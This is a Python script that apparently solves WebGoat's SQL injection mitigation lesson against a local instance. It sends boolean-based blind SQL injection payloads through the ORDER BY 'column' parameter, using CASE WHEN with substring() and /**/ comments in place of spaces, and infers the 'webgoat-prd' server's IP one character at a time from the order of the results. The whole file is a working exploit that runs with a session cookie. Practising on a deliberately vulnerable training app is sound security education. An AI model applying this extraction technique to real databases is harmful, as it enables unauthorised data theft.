#!/usr/bin/env python3
import requests
import re

# ─── HELPERS ────────────────────────────────────────────────────────────────

def page_sorts_by_hostname(response_text: str) -> bool:
    """
    Checks if the response is sorted by hostname instead of IP.
    If it's 'webgoat-acc' first, that means our CASE ... THEN hostname branch
    was taken → guess was TRUE.  Otherwise it sorted by IP → FALSE.
    """
    # Debug: print the response to see what we're getting
    print(f"DEBUG: Response length: {len(response_text)}")
    print(f"DEBUG: First 500 chars:\n{response_text[:500]}")
    
    try:
        import json
        # Parse JSON response
        servers = json.loads(response_text)
        if not servers or len(servers) == 0:
            raise RuntimeError("Empty server list in JSON response")
        
        # Check the first server's hostname
        first_hostname = servers[0].get("hostname", "")
        print(f"DEBUG: First server hostname: {first_hostname}")
        
        # If webgoat-acc is first, our condition was true (sorted by hostname)
        # If webgoat-tst is first, our condition was false (sorted by IP)
        return first_hostname == "webgoat-acc"
        
    except json.JSONDecodeError:
        print("DEBUG: Response is not JSON, trying HTML parsing...")
        # Fall back to HTML parsing if JSON fails
        tb = re.search(r"<tbody>(.*?)</tbody>", response_text, re.S)
        if not tb:
            # Try to find any table-related content
            if "<table" in response_text.lower():
                print("DEBUG: Found <table> but no <tbody>")
            if "<tr" in response_text.lower():
                print("DEBUG: Found <tr> elements")
            raise RuntimeError("No <tbody> in response")
        
        # first row
        row = re.search(r"<tr[^>]*>(.*?)</tr>", tb.group(1), re.S)
        if not row:
            raise RuntimeError("No <tr> in tbody")
        # first cell
        cell = re.search(r"<td[^>]*>([^<]+)</td>", row.group(1))
        if not cell:
            raise RuntimeError("No <td> in first row")
        first = cell.group(1).strip()
        return first == "webgoat-acc"

# ─── CONFIG ────────────────────────────────────────────────────────────────

# NOTE: remove the stray "?column=ip" — requests will append our params for us.
BASE_URL = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers"
from cookie import COOKIE  # noqa: E402
CHARSET  = "0123456789."   # digits + dot
MAX_POS  = 4            # maximum first octet length (up to 3 digits + dot)



def test_ip_char(pos: int, ch: str) -> bool:
    """
    Injects a CASE WHEN into ORDER BY that checks:
       substring((SELECT ip ...), pos, 1) = ch
    If true → ORDER BY hostname  (and first cell is webgoat-acc)
    Else   → ORDER BY ip        (first cell is webgoat-tst)
    """
    inj = (
        "CASE/**/WHEN/**/"
        f"substring((SELECT/**/ip/**/FROM/**/servers"
        f"/**/WHERE/**/hostname='webgoat-prd'),{pos},1)='{ch}'"
        "/**/THEN/**/hostname/**/ELSE/**/ip/**/END"
    )
    
    print(f"DEBUG: Testing pos={pos}, ch='{ch}'")
    print(f"DEBUG: Injection payload: {inj}")
    
    try:
        r = requests.get(
            BASE_URL,
            params={"column": inj, "direction": "asc"},
            cookies=COOKIE,
            timeout=10
        )
        print(f"DEBUG: HTTP Status: {r.status_code}")
        r.raise_for_status()
        return page_sorts_by_hostname(r.text)
    except requests.exceptions.RequestException as e:
        print(f"DEBUG: Request failed: {e}")
        raise

# ─── MAIN EXTRACTION ───────────────────────────────────────────────────────

def extract_prd_ip():
    first_octet = ""
    
    for pos in range(1, MAX_POS + 1):
        found_char = False
        for ch in CHARSET:
            if test_ip_char(pos, ch):
                print(f"[+] Position {pos}: '{ch}'")
                first_octet += ch
                found_char = True
                
                # Stop when we find the first dot (end of first octet)
                if ch == ".":
                    print(f"[+] First octet extraction complete: {first_octet[:-1]}")
                    full_ip = f"{first_octet[:-1]}.130.219.202"  # Remove the dot and append known octets
                    print(f"\n✅ Discovered webgoat-prd IP: {full_ip}")
                    return full_ip
                break
        
        if not found_char:
            print(f"[-] No match at position {pos}; stopping extraction.")
            break

    # If we reach here without finding a dot, something went wrong
    print(f"[-] Failed to find complete first octet. Partial result: {first_octet}")
    return None

if __name__ == "__main__":
    extract_prd_ip()
